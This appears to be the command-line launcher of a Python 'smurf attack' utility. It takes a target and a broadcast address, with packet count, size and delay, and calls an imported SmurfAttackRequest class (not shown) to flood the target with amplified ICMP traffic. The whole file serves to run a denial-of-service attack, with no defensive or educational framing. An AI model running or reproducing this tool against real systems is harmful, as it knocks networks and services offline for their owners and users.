import argparse
import os
import sys

from services.requests.smurfattackrequest import SmurfAttackRequest
from services.utils.exceptions import BadHostException

path = os.path.dirname(os.path.abspath(__file__))
sys.path.append(path[:-9])


def _parse_args(args):
    formatter = lambda prog: argparse.HelpFormatter(prog, max_help_position=46, width=100)

    parser = argparse.ArgumentParser(description="python smurf attack util", formatter_class=formatter)

    parser.add_argument("-t", "--target", type=str, help="<required> target name", required=True)
    parser.add_argument("-b", "--bcast", type=str, help="<required> broadcast address", required=True)
    parser.add_argument("-c", "--count", type=int, default=10, help="count of smurf packets")
    parser.add_argument("-s", "--size", type=int, default=56, help="smurf packet payload")
    parser.add_argument("-d", "--delay", type=int, default=1, help="delay time between packets send")

    if not args:
        parser.print_usage()
        sys.exit(1)

    parsed_args = parser.parse_args(args)

    return parsed_args


def main():
    args = _parse_args(sys.argv[1:])

    print('run configuration:')
    print('\ttarget = {}'.format(args.target))
    print('\tbroadcast = {}'.format(args.bcast))
    print('\tpackets count = {}'.format(args.count))
    print('\tpacket size = {} bytes'.format(args.size))
    print('\ttime delay = {} seconds\n'.format(args.delay))

    try:
        smurf = SmurfAttackRequest(args.target, args.bcast, args.count,
                                   args.size, args.delay)
        smurf.attack()
    except BadHostException as errno:
        print(errno)
    except KeyboardInterrupt:
        print("\nkeyboard interrupt")
        sys.exit(1)
    except:
        raise


if __name__ == '__main__':
    main()
